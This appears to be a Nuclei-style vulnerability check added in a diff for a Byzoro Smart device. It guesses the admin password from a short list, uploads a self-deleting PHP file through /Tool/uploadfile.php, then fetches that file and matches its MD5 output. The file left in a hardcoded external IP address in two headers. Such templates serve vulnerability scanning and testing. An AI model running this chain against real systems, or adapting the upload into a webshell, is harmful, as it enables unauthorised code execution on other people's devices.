@@ -1,0 +1,96 @@
+id: byzoro-smart-upload-2
+info:
+  name: byzoro-smart-upload-2
+  author: apple
+  severity: high
+  description: description
+  reference:
+    - https://github.com/llixixi/cve/blob/main/s45_upload_%20updatelib.md
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /login.php HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: PHPSESSID=c36d5527fd784aa29748b3b1c50be7bc
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5666.197 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate, br
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 113
+        Origin: https://{{Hostname}}
+        Referer: https://{{Hostname}}/
+        Upgrade-Insecure-Requests: 1
+        Sec-Fetch-Dest: document
+        Sec-Fetch-Mode: navigate
+        Sec-Fetch-Site: same-origin
+        Sec-Fetch-User: ?1
+        Sec-Ch-Ua-Platform: "Windows"
+        Sec-Ch-Ua: "Google Chrome";v="113", "Chromium";v="113", "Not=A?Brand";v="24"
+        Sec-Ch-Ua-Mobile: ?0
+        Te: trailers
+        Connection: close
+
+        username=admin&pwd={{password}}&find_username=&selquestion=0&txt_answer=&txt_newpwd=&txt_newpwdconfirm=&mode=login&lang=
+      - |+
+        POST /Tool/uploadfile.php? HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: PHPSESSID=c36d5527fd784aa29748b3b1c50be7bc
+        User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Content-Type: multipart/form-data; boundary=---------------------------886123294864872782496578758
+        Content-Length: 391
+        Origin: https://113.140.35.82:8443
+        Referer: https://113.140.35.82:8443/Tool/uploadfile.php
+        Upgrade-Insecure-Requests: 1
+        Sec-Fetch-Dest: document
+        Sec-Fetch-Mode: navigate
+        Sec-Fetch-Site: same-origin
+        Sec-Fetch-User: ?1
+        Te: trailers
+        Connection: close
+
+        -----------------------------886123294864872782496578758
+        Content-Disposition: form-data; name="file_upload"; filename="phpinfo.php"
+        Content-Type: application/octet-stream
+
+        <?php echo(md5(1)); unlink(__FILE__); ?>
+        -----------------------------886123294864872782496578758
+        Content-Disposition: form-data; name="txt_path"
+
+        /usr/hddocs/nsg/home/2.php
+        -----------------------------886123294864872782496578758—
+      - |+
+        GET /home/2.php HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: PHPSESSID=c36d5527fd784aa29748b3b1c50be7bc
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5666.197 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate, br
+        Upgrade-Insecure-Requests: 1
+        Sec-Fetch-Dest: document
+        Sec-Fetch-Mode: navigate
+        Sec-Fetch-Site: none
+        Sec-Fetch-User: ?1
+        Sec-Ch-Ua-Platform: "Windows"
+        Sec-Ch-Ua: "Google Chrome";v="113", "Chromium";v="113", "Not=A?Brand";v="24"
+        Sec-Ch-Ua-Mobile: ?0
+        Te: trailers
+        Connection: close
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - c4ca4238a0b923820dcc509a6f75849b
+    payloads:
+      password:
+        - admin
+        - 123456
+        - 111111
+        - 12345678
+    stop-at-first-match: true
